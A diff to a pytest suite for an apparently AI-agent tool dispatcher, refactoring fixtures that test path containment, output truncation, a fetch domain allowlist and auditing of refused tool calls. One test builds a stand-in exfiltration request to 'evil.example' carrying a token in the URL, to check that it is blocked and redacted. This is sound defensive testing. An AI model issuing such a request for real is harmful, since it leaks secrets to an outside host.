@@ -9,15 +9,15 @@ containment holds at the handler as well as at the chokepoint.
 from __future__ import annotations
 
 import ast
+import dataclasses
 import json
 import time
+from collections.abc import Iterator
 from pathlib import Path
 from typing import ClassVar
 
 import pytest
-from tests.conftest import patch_home
 
-import docket.config as _cfg
 from docket.core import approval as core_approval
 from docket.core import tools as core_tools
 from docket.core.llm import ToolCall
@@ -35,7 +35,7 @@ from docket.core.tools import (
 )
 from docket.edges.adapters import toolbox
 from docket.edges.adapters.toolbox import PathEscapeError, ToolOutcome, resolve_within
-from docket.kernel.home import current_home
+from docket.kernel.home import Home, current_home, use_home
 
 SUBJECT = "docket.core.tools"
 
@@ -43,13 +43,19 @@ REPO_ROOT = Path(__file__).resolve().parents[3]
 
 
 @pytest.fixture(autouse=True)
-def _isolate_gates(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+def _isolate_gates(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
     """Isolate `core/policy.py` and `core/approval.py`'s real stores from a
     developer's ``~/.docket``, and set the approval timeout to 0 so a gated
     call nothing grants resolves immediately (fail-closed to denied)."""
-    monkeypatch.setattr(_cfg, "POLICIES_DIR", tmp_path / "_policies", raising=True)
-    monkeypatch.setattr(_cfg, "APPROVALS_DIR", tmp_path / "_approvals", raising=True)
-    monkeypatch.setattr(_cfg, "TOOL_APPROVAL_TIMEOUT", 0, raising=True)
+    with use_home(
+        dataclasses.replace(
+            current_home(),
+            policies_dir_override=tmp_path / "_policies",
+            approvals_dir_override=tmp_path / "_approvals",
+            tool_approval_timeout=0,
+        )
+    ):
+        yield
 
 
 @pytest.fixture
@@ -551,18 +557,18 @@ class TestBuiltinHandlers:
         out = toolbox.read_file((workspace,), "big.txt")
         assert out.ok and "[truncated:" in out.content
 
-    def test_the_output_ceiling_is_a_live_setting(
-        self, workspace: Path, monkeypatch: pytest.MonkeyPatch
-    ) -> None:
+    def test_the_output_ceiling_is_a_live_setting(self, workspace: Path) -> None:
         """A small-context endpoint must be able to lower it -- 30k chars is two results away from overflowing a 16k window, and the turn dies on an HTTP 400 with no partial progress."""
         body = "x" * 5_000
         (workspace / "mid.txt").write_text(body)
         assert "[truncated:" not in toolbox.read_file((workspace,), "mid.txt").content
 
-        patch_home(monkeypatch, tool_max_output_chars=1_000)
-        out = toolbox.read_file((workspace,), "mid.txt")
-        numbered_length = len(f"{1}\t{body}")
-        assert out.ok and f"[truncated: {numbered_length - 1_000} more characters]" in out.content
+        with use_home(dataclasses.replace(current_home(), tool_max_output_chars=1_000)):
+            out = toolbox.read_file((workspace,), "mid.txt")
+            numbered_length = len(f"{1}\t{body}")
+            assert (
+                out.ok and f"[truncated: {numbered_length - 1_000} more characters]" in out.content
+            )
 
 
 class TestDispatchChokepoint:
@@ -766,10 +772,13 @@ class TestResultReportedBackToTheModel:
 
 class TestRegistry:
     @pytest.fixture(autouse=True)
-    def _fetch_allowlisted(self, monkeypatch: pytest.MonkeyPatch) -> None:
+    def _fetch_allowlisted(self, monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
         """`fetch` is offered only with an allowlist (agent-loop requirement 83); these tests
         describe the full built-in set."""
-        monkeypatch.setattr(_cfg, "FETCH_ALLOWED_DOMAINS", ("api.example.test",), raising=True)
+        with use_home(
+            dataclasses.replace(current_home(), fetch_allowed_domains=("api.example.test",))
+        ):
+            yield
 
     def test_builtins_present(self) -> None:
         assert builtin_registry().names() == [
@@ -950,17 +959,16 @@ message: canary
 
 
 @pytest.fixture()
-def pod_input_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+def pod_input_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
     """A home whose pod `mypod` carries one `on: input` block policy and no global ones."""
-    from tests.conftest import repoint_docket_home
 
     home = tmp_path / "home"
-    repoint_docket_home(monkeypatch, home)
-    policies = _cfg.pod_config_dir("mypod") / "policies"
-    policies.mkdir(parents=True)
-    (policies / "block-canary.yaml").write_text(_POD_INPUT_BLOCK)
-    _cfg.POLICIES_DIR.mkdir(parents=True, exist_ok=True)
-    return home
+    with use_home(Home(home)):
+        policies = current_home().pod_config_dir("mypod") / "policies"
+        policies.mkdir(parents=True)
+        (policies / "block-canary.yaml").write_text(_POD_INPUT_BLOCK)
+        current_home().policies_dir.mkdir(parents=True, exist_ok=True)
+        yield home
 
 
 class TestUntrustedResultScreensSeeThePodPolicy:
@@ -1015,13 +1023,13 @@ class TestRefusedCallsAreAudited:
         from docket.edges.adapters import fetch as fetch_mod
 
         monkeypatch.setattr(fetch_mod, "_allowed_domains", lambda: frozenset({"ok.example"}))
-        monkeypatch.setattr(_cfg, "FETCH_ALLOWED_DOMAINS", ("ok.example",), raising=True)
-        url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
-        dispatch_tool(_call("fetch", url), ctx, builtin_registry())
-        (entry,) = self._refused()
-        detail = str(entry["detail"])
-        assert "tool=fetch" in detail and "kind=fetch_not_allowed" in detail
-        assert "evil.example" in detail and "SECRETQ" not in detail
+        with use_home(dataclasses.replace(current_home(), fetch_allowed_domains=("ok.example",))):
+            url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
+            dispatch_tool(_call("fetch", url), ctx, builtin_registry())
+            (entry,) = self._refused()
+            detail = str(entry["detail"])
+            assert "tool=fetch" in detail and "kind=fetch_not_allowed" in detail
+            assert "evil.example" in detail and "SECRETQ" not in detail
 
     def test_an_allowed_call_and_an_ordinary_failure_write_nothing(self, ctx: ToolContext) -> None:
         ok = dispatch_tool(_call("read", json.dumps({"path": "notes.md"})), ctx, builtin_registry())
